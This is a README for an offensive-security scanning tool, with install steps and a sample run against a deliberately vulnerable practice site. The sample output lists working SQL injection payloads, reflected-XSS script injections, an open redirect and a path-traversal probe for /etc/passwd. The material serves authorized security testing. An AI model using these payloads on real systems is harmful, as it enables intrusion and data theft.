<h1 align="center">yublueflower</h1>

<p align="center">
  A suite integrating open-source workflows tailored for offensive security.
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Kali-268BEE?style=for-the-badge&logo=kalilinux&logoColor=white">
</p>

## Overview

```bash

            .      .-~\
           / `-'.'    `- :
           |    /          `._
           |   |   .-.        {
            \  |   `-'         `.
          .  \ |                /    We exploit flaws, not people.
        ~-.`.\ \|            .-~_
           `.\-.\       .-~      \
             `-'/~~ -.~          /
           .-~/|`-._ /~~-.~ -- ~
          /  |  \    ~- . _\

A suite integrating open-source workflows tailored for offensive security.
Author: 1337rokudenashi
Current yublueflower version v0.0.3 (latest)

Usage:
yublueflower -url http://testphp.vulnweb.com/

Options:
-help                 Show help message.
-url <URL>            Scan as well as test utilizing security flaw templates.
-highly-aggressive    Highly aggressive testing.
-silent               Skip URL gathering noise to keep testing clean.
```

A suite integrating open-source workflows tailored for offensive security, yublueflower provides comprehensive vulnerability assessments.
This tool is designed to be flexible and effective in supporting offensive security workflows. It has been tested to work smoothly on WSL (Windows Subsystem for Linux) with Kali Linux.

## Features

- **Reconnaissance Phase**:
  - Aggressively gathering URLs.
- **Vulnerability Assessment Phase**:
  - Assessing vulnerabilities offensively, scanning as well as testing utilizing security flaw templates.
- **Reporting Phase**:
  - Results flawlessly generated.
- **Options**:
  - Highly aggressive testing.
  - Skip URL gathering noise to keep testing clean.

## System Requirements

- **Operating System**: WSL (Windows Subsystem for Linux) with Kali Linux
- **Dependencies**: go.dev (see [installation instructions](https://go.dev/doc/install))
- **Dependencies**: nodejs (see [installation instructions](https://nodejs.org/en/download))

## Installation

To install yublueflower, clone the repository and set up the tool as follows:

```bash
git clone https://github.com/1337rokudenashi/yublueflower.git
cd yublueflower
chmod +x yublueflower
bash yublueflower
```

## Usage

To run the tool, use the following command:

```bash
yublueflower -url http://testphp.vulnweb.com/
```

```bash

            .      .-~\
           / `-'.'    `- :
           |    /          `._
           |   |   .-.        {
            \  |   `-'         `.
          .  \ |                /    We exploit flaws, not people.
        ~-.`.\ \|            .-~_
           `.\-.\       .-~      \
             `-'/~~ -.~          /
           .-~/|`-._ /~~-.~ -- ~
          /  |  \    ~- . _\

A suite integrating open-source workflows tailored for offensive security.
Author: 1337rokudenashi
Current yublueflower version v0.0.3 (latest)

Testing started at 13:37:01 01-03-2025
🟢 Reconnaissance Phase: Aggressively gathering URLs...
http://testphp.vulnweb.com/redir.php?r=https://getgophish.com/
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1 AND UPDATEXML(3477,CONCAT(0x2e,0x7176716271,(SELECT (ELT(3477=3477,1))),0x716b786b71),6541)
http://testphp.vulnweb.com/artists.php?artist=1 order by 4
http://testphp.vulnweb.com/product.php?pic=3) AND 4294=2769 AND (1005=1005
http://testphp.vulnweb.com/listproducts.php?cat=1
http://testphp.vulnweb.com/?
http://testphp.vulnweb.com/showimage.php?ﬁle=13745325-cd3d-4961-b71d-d04727bb02b0
http://testphp.vulnweb.com/comment.php?aid=' UNION SELECT * FROM information_schema --
http://testphp.vulnweb.com/search.php?test=<USER_INPUT>
http://testphp.vulnweb.com/Mod_Rewrite_Shop/rate.php?id=-1 OR 17-7=10CONFIRMED
http://testphp.vulnweb.com/hpp/params.php?aaaa/=
http://testphp.vulnweb.com/login.php?id=1
http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=-1 OR 17-7=10 PROCEDURE ANALYSE(EXTRACTVALUE(6706,CONCAT(0x5c,0x7176627671,(SELECT (CASE WHEN (6706=6706) THEN 1 ELSE 0 END)),0x716a627a71)),1)
http://testphp.vulnweb.com/hpp/?pp='"--></style></scRipt><scRipt src="//mv9e8mbvffulk1i0duvujvkdkktmkntnztbb8kejrja
http://testphp.vulnweb.com/˓→artists.php?artist=0
http://testphp.vulnweb.com/secured/phpinfo.php?=PHPE9568F35-D428-11d2-A769-00AA001ACF42
http://testphp.vulnweb.com/pictures/credentials.txtA01http://testphp.vulnweb.com/product.php?pic=1
http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=-
http://testphp.vulnweb.com/˓→listproducts.php?cat=FUZZ*********************************************************
http://testphp.vulnweb.com/index.zipA01http://testphp.vulnweb.com/listproducts.php?artist=1A01
http://testphp.vulnweb.com/index.php?%id%=1
http://testphp.vulnweb.com/categories.php/listproducts.php?cat='
http://testphp.vulnweb.com/artist.php?artist=1
http://testphp.vulnweb.com/hpp/?pp=12
http://testphp.vulnweb.com/artists.php?artist=3
http://testphp.vulnweb.com/listproducts.php?cat=1
http://testphp.vulnweb.com/hpp/params.php?p=valid
http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg
http://testphp.vulnweb.com/product.php?pic=6
🟢 Vulnerability Assessment Phase: Assessing vulnerabilities offensively, scanning as well as testing utilizing security flaw templates...
[waf-detect:nginxgeneric] [http] [info] http://testphp.vulnweb.com/
[php-errors] [http] [info] http://testphp.vulnweb.com/ ["Warning: mysql_connect()"]
[nginx-version] [http] [info] http://testphp.vulnweb.com/ ["nginx/1.19.0"]
[php-detect] [http] [info] http://testphp.vulnweb.com/ ["5.6.40"]
[open-redirect] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://oast.me [query:r] [GET]
[sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/listproducts.php?cat=1%ef%80%a0' ["SQL syntax; check the manual that corresponds to your MySQL","check the manual that corresponds to your MySQL server version"] [query:cat] [GET]
[sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/artists.php?artist=1+order+by+4' ["SQL syntax; check the manual that corresponds to your MySQL","check the manual that corresponds to your MySQL server version"] [query:artist] [GET]
[sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=-1+OR+17-7=10+PROCEDURE+ANALYSE(EXTRACTVALUE(6706,CONCAT(0x5c,0x7176627671,(SELECT+(CASE+WHEN+(6706=6706)+THEN+1+ELSE+0+END)),0x716a627a71)),1)' ["SQL syntax; check the manual that corresponds to your MySQL","check the manual that corresponds to your MySQL server version"] [query:id] [GET]
[sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/product.php?pic=3)+AND+4294=2769+AND+(1005=1005' ["SQL syntax; check the manual that corresponds to your MySQL","check the manual that corresponds to your MySQL server version"] [query:pic] [GET]
[sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/AJAX/infoartist.php?id=1+AND+UPDATEXML(3477,CONCAT(0x2e,0x7176716271,(SELECT+(ELT(3477=3477,1))),0x716b786b71),6541)' ["SQL syntax; check the manual that corresponds to your MySQL","check the manual that corresponds to your MySQL server version"] [query:id] [GET]
[sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=-' ["SQL syntax; check the manual that corresponds to your MySQL","check the manual that corresponds to your MySQL server version"] [query:id] [GET]
[sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/Mod_Rewrite_Shop/rate.php?id=-1+OR+17-7=10CONFIRMED' ["SQL syntax; check the manual that corresponds to your MySQL","check the manual that corresponds to your MySQL server version"] [query:id] [GET]
[sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/search.php?test=<USER_INPUT>' ["SQL syntax; check the manual that corresponds to your MySQL","check the manual that corresponds to your MySQL server version"] [query:test] [GET]
[open-redirect] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://oast.me [query:r] [GET]
[reflected-xss] [http] [medium] http://testphp.vulnweb.com/hpp/?pp='"--></style></scRipt><scRipt+src="//mv9e8mbvffulk1i0duvujvkdkktmkntnztbb8kejrja'"><69347> [query:pp] [GET]
[reflected-xss] [http] [medium] http://testphp.vulnweb.com/search.php?test=<USER_INPUT>'"><69347> [query:test] [GET]
[reflected-xss] [http] [medium] http://testphp.vulnweb.com/product.php?pic=3)+AND+4294=2769+AND+(1005=1005'"><69347> [query:pic] [GET]
[reflected-xss] [http] [medium] http://testphp.vulnweb.com/Mod_Rewrite_Shop/rate.php?id=-1+OR+17-7=10CONFIRMED'"><69347> [query:id] [GET]
[reflected-xss] [http] [medium] http://testphp.vulnweb.com/artists.php?artist=1+order+by+4'"><69347> [query:artist] [GET]
[reflected-xss] [http] [medium] http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=-'"><69347> [query:id] [GET]
[reflected-xss] [http] [medium] http://testphp.vulnweb.com/listproducts.php?cat=1%ef%80%a0'"><69347> [query:cat] [GET]
[sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/listproducts.php?cat=1' ["SQL syntax; check the manual that corresponds to your MySQL","check the manual that corresponds to your MySQL server version"] [query:cat] [GET]
[sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/artists.php?artist=3' ["check the manual that corresponds to your MySQL server version","SQL syntax; check the manual that corresponds to your MySQL"] [query:artist] [GET]
[sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/product.php?pic=6' ["SQL syntax; check the manual that corresponds to your MySQL","check the manual that corresponds to your MySQL server version"] [query:pic] [GET]
[reflected-xss] [http] [medium] http://testphp.vulnweb.com/listproducts.php?cat=1'"><77225> [query:cat] [GET]
[reflected-xss] [http] [medium] http://testphp.vulnweb.com/product.php?pic=6'"><77225> [query:pic] [GET]
[reflected-xss] [http] [medium] http://testphp.vulnweb.com/hpp/params.php?p=valid'"><77225> [query:p] [GET]
[linux-lfi-fuzz] [http] [high] http://testphp.vulnweb.com/showimage.php?file=../../etc/passwd [GET]
[reflected-xss] [http] [medium] http://testphp.vulnweb.com/hpp/?pp=12'"><77225> [query:pp] [GET]
[reflected-xss] [http] [medium] http://testphp.vulnweb.com/artists.php?artist=3'"><77225> [query:artist] [GET]
🟢 Reporting Phase: Results flawlessly generated...
Results at /home/yublueflower/glow_yublueflower
Testing finished at 13:44:01 01-03-2025
Use command glow yublueflower_20250301_133701 to see results.
```

## Contributing

We welcome contributions! Feel free to fork the repository, improve the tool, and submit a pull request.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Author

Developed and maintained by 1337rokudenashi.
